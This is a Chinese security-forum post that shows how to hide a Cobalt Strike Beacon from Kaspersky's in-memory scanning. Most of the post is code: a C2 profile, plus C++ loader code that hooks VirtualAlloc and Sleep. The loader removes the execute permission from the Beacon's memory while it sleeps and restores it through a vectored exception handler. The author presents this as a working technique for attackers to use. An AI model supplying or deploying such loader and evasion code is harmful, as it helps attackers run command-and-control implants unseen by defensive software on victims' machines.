> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/9399)

上次看到 yansu 大佬写了一篇 cs bypass 卡巴斯基内存查杀，这次正好有时间我也不要脸的跟跟风，所以同样发在先知社区

yansu 大佬是通过对 cs 的特征进行 bypass，这次让我们换一种思路，尝试从另一个角度来绕过内存扫描，本文仅作为一种思路大佬误喷。

我们知道内存扫描是耗时耗力不管是卡巴还是其他杀软，一般来说都是扫描进程中一些高危的区域比如带有可执行属性的内存区域，既然他扫描带有 X（可执行）属性的内存区域那么只要我们去除 X 属性，那自然就不会被扫也就不会被发现，但问题是去除 X 属性后 Beacon 也就跑不起来，但是不用怕我们知道 Windows 进程触发异常时我们可以对它处理，而此时我们可以在一瞬间恢复内存 X 属性让它跑起来然后等它再次进入 sleep 时去除 X 属性隐藏起来

首先是准备工作

C2 配置一份，为了演示效果我什么也不开就一份最普通的配置

```
# default sleep time is 60s
set sleeptime "60000";

# jitter factor 0-99% [randomize callback times]
set jitter    "0";

# maximum number of bytes to send in a DNS A record request
set maxdns    "255";

# indicate that this is the default Beacon profile
set sample_name "Cobalt Strike Beacon (Default)";

# define indicators for an HTTP GET
http-get {
    # Beacon will randomly choose from this pool of URIs
    set uri "/test";

    client {
        # base64 encode session metadata and store it in the Cookie header.
        metadata {
            base64;
            header "Cookie";
        }
    }

    server {
        # server should send output with no changes
        header "Content-Type" "application/octet-stream";

        output {
            print;
        }
    }
}

# define indicators for an HTTP POST
http-post {

    set uri "/test.php";

    client {
        header "Content-Type" "application/octet-stream";

        # transmit our session identifier as /submit.php?id=[identifier]
        id {
            parameter "id";
        }

        # post our output with no real changes
        output {
            print;
        }
    }

    # The server's response to our HTTP POST
    server {
        header "Content-Type" "text/html";

        # this will just print an empty string, meh...
        output {
            print;
        }
    }
}
```

payload 选择生成无阶段原始格式，因为我是 x64 loader 所以把 x64 勾选上

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210403233527-3725a51c-9492-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210403233527-3725a51c-9492-1.png)

思路和代码都很简单我也不会对 Beacon 做任何加密，思路如下

首先创建事件用来同步线程

```
hEvent = CreateEvent(NULL, TRUE, false, NULL);


```

设置 VEH 异常处理函数，用来在因内存 X 属性取消后触发异常时恢复 X 属性

```
LONG NTAPI FirstVectExcepHandler(PEXCEPTION_POINTERS pExcepInfo)
{
    printf("FirstVectExcepHandler\n");
    printf("异常错误码:%x\n", pExcepInfo->ExceptionRecord->ExceptionCode);
    printf("线程地址:%llx\n", pExcepInfo->ContextRecord->Rip);
    if (pExcepInfo->ExceptionRecord->ExceptionCode == 0xc0000005 && is_Exception(pExcepInfo->ContextRecord->Rip))
    {
        printf("恢复Beacon内存属性\n");
        VirtualProtect(Beacon_address, Beacon_data_len, PAGE_EXECUTE_READWRITE, &Beacon_Memory_address_flOldProtect);
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

AddVectoredExceptionHandler(1, &FirstVectExcepHandler);


```

然后就是 HOOK VirtualAlloc 和 sleep 函数，Hook VirtualAlloc 函数的原因是我们需要知道 Beacon 在自展开时分配的可执行内存起始地址和大小是多少好在后面对这块内存取消 X 属性以免被扫描，Hool Sleep 函数是因为我们需要在 Beacon 进入 Sleep 后立马取消 Beacon 内存区域的 X 属性

```
static LPVOID (WINAPI *OldVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) = VirtualAlloc;
LPVOID WINAPI NewVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
    Beacon_data_len = dwSize;
    Beacon_address = OldVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
    printf("分配大小:%d", Beacon_data_len);
    printf("分配地址:%llx \n", Beacon_address);
    return Beacon_address;
}

static VOID (WINAPI *OldSleep)(DWORD dwMilliseconds) = Sleep;
void WINAPI NewSleep(DWORD dwMilliseconds)
{
    if (Vir_FLAG)
    {
        VirtualFree(shellcode_addr, 0, MEM_RELEASE);
        Vir_FLAG = false;
    }
    printf("sleep时间:%d\n", dwMilliseconds);
    SetEvent(hEvent);
    OldSleep(dwMilliseconds);
}

//用的微软的Detour库
void Hook()
{
    DetourRestoreAfterWith(); //避免重复HOOK
    DetourTransactionBegin(); // 开始HOOK
    DetourUpdateThread(GetCurrentThread());
    DetourAttach((PVOID*)&OldVirtualAlloc, NewVirtualAlloc);
    DetourAttach((PVOID*)&OldSleep, NewSleep);
    DetourTransactionCommit(); //  提交HOOK
}


```

然后创建一个线程用来在 Beacon 进入睡眠之后立刻取消 Beacon 内存区域的 X 属性

```
DWORD WINAPI Beacon_set_Memory_attributes(LPVOID lpParameter)
{
    printf("Beacon_set_Memory_attributes启动\n");
    while (true)
    {
        WaitForSingleObject(hEvent, INFINITE);
        printf("设置Beacon内存属性不可执行\n");
        VirtualProtect(Beacon_address, Beacon_data_len, PAGE_READWRITE, &Beacon_Memory_address_flOldProtect);
        ResetEvent(hEvent);
    }
    return 0;
}

HANDLE hThread1 = CreateThread(NULL, 0, Beacon_set_Memory_attributes, NULL, 0, NULL);
CloseHandle(hThread1);


```

最后就是读取 Beacon.bin 加载进内存执行了

```
unsigned char *BinData = NULL;
size_t size = 0;

//别忘了向Test.bin最开始的位置插入两三个90
char* szFilePath = "C:\\Users\\WBG\\Downloads\\Test.bin";
BinData = ReadBinaryFile(szFilePath, &size);
shellcode_addr = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);
memcpy(shellcode_addr, BinData, size);
VirtualProtect(shellcode_addr, size, PAGE_EXECUTE_READWRITE, &Beacon_Memory_address_flOldProtect);
(*(int(*)()) shellcode_addr)();


```

总结概括一下思路就是

Beacon 进入睡眠就取消它内存的可执行属性，等 Beacon 线程醒来时触发异常交由 VEH 异常处理函数恢复内存的可执行属性，然后 Beacon 执行完成后又进入睡眠一直重复上述过程

效果如图

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210403233131-aa8c58bc-9491-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210403233131-aa8c58bc-9491-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210403233142-b0def9cc-9491-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210403233142-b0def9cc-9491-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210403233200-bb747164-9491-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210403233200-bb747164-9491-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210403233210-c1a71ff0-9491-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210403233210-c1a71ff0-9491-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210403233222-c8e82e12-9491-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210403233222-c8e82e12-9491-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210403233229-cd243656-9491-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210403233229-cd243656-9491-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210403233238-d25737c2-9491-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210403233238-d25737c2-9491-1.png)

提醒本文仅仅提供一种思路细节需要你自己去研究，代码一共不超过 200 行，不限制转载但是禁止拿去割韭菜